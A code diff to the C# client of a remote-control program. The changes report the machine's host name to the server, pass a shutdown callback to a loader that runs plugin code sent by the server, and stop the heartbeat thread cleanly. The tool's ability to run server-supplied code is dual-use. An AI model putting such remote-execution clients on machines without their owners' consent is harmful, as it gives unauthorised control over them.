@@ -16,6 +16,8 @@ using Microsoft.VisualBasic.Devices;
 using RemoteControl.Protocals.Request;
 using RemoteControl.Protocals.Plugin;
 using RemoteControl.Protocals.Utilities;
+using System.Net;
+using RemoteControl.Protocals.Response;
 
 namespace RemoteControl.Client
 {
@@ -37,6 +39,8 @@ namespace RemoteControl.Client
         private static string lastMsgBoxExeFile = null;
         private static string lastPlayMusicExeFile = null;
         private static Dictionary<string, List<byte>> codePluginDic = new Dictionary<string, List<byte>>();
+        private static bool isClosing = false;
+        private static Thread heartbeatThread = null;
 
         static void Main(string[] args)
         {
@@ -44,7 +48,8 @@ namespace RemoteControl.Client
             //MouseOpeUtil.MouseDown(eMouseButtons.Left, new Point() { X = 100, Y = 100 });
             ReadParameters();
             StartConnect();
-            new Thread(() => StartHeartbeat()) { IsBackground = true }.Start();
+            heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
+            heartbeatThread.Start();
             StartMonitor();
         }
 
@@ -89,6 +94,12 @@ namespace RemoteControl.Client
         {
             string sessionId = oServer.RemoteEndPoint.ToString();
             SocketSession session = new SocketSession(sessionId, oServer);
+
+            // 获取主机名，并告诉服务器
+            ResponseGetHostName resp = new ResponseGetHostName();
+            resp.HostName = Dns.GetHostName();
+            session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);
+
             new Thread(() =>
             {
                 byte[] buffer = new byte[1024];
@@ -572,7 +583,7 @@ namespace RemoteControl.Client
                         var req = obj as RequestRunExecCode;
                         if(codePluginDic.ContainsKey(req.ID))
                         {
-                            PluginLoader.LoadPlugin(codePluginDic[req.ID].ToArray());
+                            PluginLoader.LoadPlugin(codePluginDic[req.ID].ToArray(), OnFireQuit);
                             codePluginDic.Remove(req.ID);
                         }
                     }
@@ -1001,6 +1012,10 @@ namespace RemoteControl.Client
         {
             while (true)
             {
+                if (isClosing)
+                {
+                    break;
+                }
                 try
                 {
                     if (oServer != null)
@@ -1049,6 +1064,28 @@ namespace RemoteControl.Client
                 {
                     MessageBox.Show(content, title, buttons, icon);
                 }) { IsBackground = true }.Start();
+        }
+
+        static void OnFireQuit(object sender, EventArgs e)
+        {
+            isClosing = true;
+            if (heartbeatThread != null)
+            {
+                heartbeatThread.Join();
+            }
+
+            if (oServer != null)
+            {
+                try
+                {
+                    oServer.Close();
+                }
+                catch (Exception ex)
+                {
+                    
+                }
+            }
+            Environment.Exit(0);
         }
 
     }
